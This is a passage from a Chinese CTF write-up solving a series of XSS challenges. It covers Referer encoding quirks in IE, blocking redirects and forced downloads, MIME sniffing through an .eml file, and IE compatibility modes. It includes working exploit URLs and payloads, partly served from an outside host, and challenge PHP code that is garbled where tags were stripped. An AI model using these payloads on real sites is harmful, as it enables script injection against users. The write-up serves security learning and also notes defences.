修复方案: 加上响应头，`X-Content-Type-Options: nosniff`
### 4\. Referer
输出点是referer，chrome、firefox会对query进行url编码，但是IE并不会
参考文章:  
捉到一个M师傅：
IE11 exp: `http://ns1.rootk.pw:8080/xss/wp/4.html?a`
* * *
M师傅语录:
Referrer不会被URL编码的现象，主要是在Windows7和Windows8.1  
Win10的IE11以前也有，不过在打完Anniversary
Update补丁之后，在对referrer的处理上做了一些改动。变成了会对referrer进行URL编码
所以比较通用的办法是通过flash发送请求，AS代码如下：
    package {
    import flash.display.Sprite;
    import flash.net.URLRequest;
    import flash.net.navigateToURL;
    public class xss_referrer extends Sprite{
      public function xss_referrer() {
       var url:URLRequest = new URLRequest("https://vulnerabledoma.in/xss_referrer");
       navigateToURL(url, "_self");
      }
    }
    }
Ref:
* * *
另外在找资料也看到一些东西，记录一下
    # 会传送referer
    https->https
    http->https
    http->http
    # 不会传送refer
    https->http
### 5\. 跳转
    如果跳转失败请点我";?>
这个问题主要是想办法去让浏览器不进行跳转.
翻到p师傅blog曾经对bottle http注入的一段: 
这里我使用的是端口小于80，FF就不会进行跳转
FF exp:
    http://xianzhi.aliyun.com/xss5.php?url=http://baidu.com:0/'%3E
ref: 
### 6\. 强制下载
    "http://0" && substr($_GET["url"],0,8)<>"http://1" && substr($_GET["url"],0,8)<>"http://l" && strpos($_GET["url"], '@') === false)
    {
    $opts = array('http' =>
        array(
            'method' => 'GET',
            'max_redirects' => '0',
            'ignore_errors' => '1'
        )
    );
    $context = stream_context_create($opts);
    $url=str_replace("..","",$_GET["url"]);
    $stream = fopen($url, 'r', false, $context);
    echo stream_get_contents($stream);
    }
    else
    {
    echo "Bad URL!";
    }
    ?>
[http://xianzhi.aliyun.com/xss6.php?filename=download&url=http://xianzhi.aliyun.com/xss2.php](http://xianzhi.aliyun.com/xss6.php?filename=download&url=http://xianzhi.aliyun.com/xss2.php)
这个是需要绕过文件下载，在第5题中p师傅的文章里面提到了一个点
    为PHP的header函数一旦遇到\0、\r、\n这三个字符，就会抛出一个错误，此时Location头便不会返回，浏览器也就不会跳转了
同理是可以用在文件下载中
FF exp:
    http://xianzhi.aliyun.com/xss6.php?url=http://ns1.rootk.pw:8080/xss/wp/6.php&filename=aaa%0a
ref: 
### 7\. text/plain
    "http://0" && substr($_GET["url"],0,8)<>"http://1" && substr($_GET["url"],0,8)<>"http://l" && strpos($_GET["url"], '@') === false)
    {
    $opts = array('http' =>
        array(
            'method' => 'GET',
            'max_redirects' => '0',
            'ignore_errors' => '1'
        )
    );
    $context = stream_context_create($opts);
    $url=str_replace("..","",$_GET["url"]);
    $stream = fopen($url, 'r', false, $context);
    echo stream_get_contents($stream);
    }
    else
    {
    echo "Bad URL!";
    }
    ?>
MIME的题目，返回头Type为text/plain应该如何绕过
找到一个近期公布的IE 0day  
利用的是email文件，里面的内容会被解析html，这里可以利用iframe来加载目标地址，这样内容就会被解析啦。
IE exp:  
9.eml
    TESTEML
    Content-Type: text/html
    Content-Transfer-Encoding: quoted-printable
    =3Ciframe=20src=3D=27http=3A=2f=2fxianzhi.aliyun.com=2fxss7.php=3Furl=3Dhttp=3A=2f=2fns1.rootk.pw=3A8080=2fxss=2fwp=2f9.txt=3Fname=3D=3CHTML=3E=3Ch1=3Eit=20works=3C=2Fh1=3E=27=3E=3C=2Fiframe=3E
防御：这里多亏M师傅的提醒，文章中的`X-Content-Type-Options: nosniff`是可以防御的，相反`X-Frame-Options:
DENY`并不能从根本去解决这个问题，这个只是防御了一种攻击方式，但是漏洞点却还在，真是留了一个大坑.
ref: 
### 8\. 标签
    "http://0" && substr($_GET["url"],0,8)<>"http://1" && substr($_GET["url"],0,8)<>"http://l" && strpos($_GET["url"], '@') === false)
    {
    $rule="/
        array(
            'method' => 'GET',
            'max_redirects' => '0',
            'ignore_errors' => '1'
        )
    );
    $context = stream_context_create($opts);
    $url=str_replace("..","",$_GET["url"]);
    $stream = fopen($url, 'r', false, $context);
    $content=stream_get_contents($stream);
    if(preg_match($rule,$content))
    {
    echo "XSS Detected!";
    }
    else
    {
    echo $content;
    }
    }
    else
    {
    echo "Bad URL!";
    }
    ?>
此题想考察的是`
    A sequence of bytes starting with: 0x3C 0x21 (ASCII '
现在问题就是IE11这个是无法触发的，但是可以通过`x-ua-compatible`设置文档兼容性，让它也能够兼容IE9、10的内容
**即便iframe内页面和父窗口即便不同域，iframe内页面也会继承父窗口的兼容模式，所以IE的一些老技巧、特性可以通过此方法去复活它.**
IE11 exp:  
8.html
### 9\. plaintext
代码简单，但是绝对够爽的一道题目，就是如何逃逸`plaintext`这个标签